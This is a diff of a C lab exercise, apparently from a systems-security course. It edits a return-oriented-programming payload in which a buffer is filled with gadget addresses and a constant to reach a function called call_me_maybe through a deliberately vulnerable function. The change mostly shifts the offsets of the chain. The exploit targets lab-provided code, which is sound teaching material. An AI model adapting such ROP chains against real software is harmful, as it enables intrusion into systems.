@@ -34,7 +34,7 @@ void lab_code() {
 
 	// Fill the array with 0xFF's and set the last character to be a new line.
 	memset(your_string, 0xFF, sizeof(your_string));
-	your_string[0] = 0x000000000000000A;
+	your_string[127] = 0x000000000000000A;
 
 	// For now we don't worry about ASLR, we can directly use these addresses:
 	uint64_t gadget1_addr = (uint64_t)&gadget1;
@@ -50,15 +50,15 @@ void lab_code() {
 
 	// Recall that arg1 is rdi, arg2 is rsi, and arg3 is rdx.
 	// See gadgets.s for the gadget definitions.
-	your_string[-1]=gadget3_addr;
-	your_string[0]=gadget5_addr;
-	your_string[1]=gadget5_addr;
-	your_string[2]=gadget6_addr;
-	your_string[3]=gadget2_addr;
-	your_string[4]=gadget1_addr;
-	your_string[5]=191;
-	your_string[6]=gadget4_addr;
-	your_string[7]=call_me_maybe_addr;
+	your_string[3]=gadget3_addr;
+	your_string[4]=gadget5_addr;
+	your_string[5]=gadget5_addr;
+	your_string[6]=gadget6_addr;
+	your_string[7]=gadget2_addr;
+	your_string[8]=gadget1_addr;
+	your_string[9]=191;
+	your_string[10]=gadget4_addr;
+	your_string[11]=call_me_maybe_addr;
 	
 	vulnerable((char *)your_string);
 }
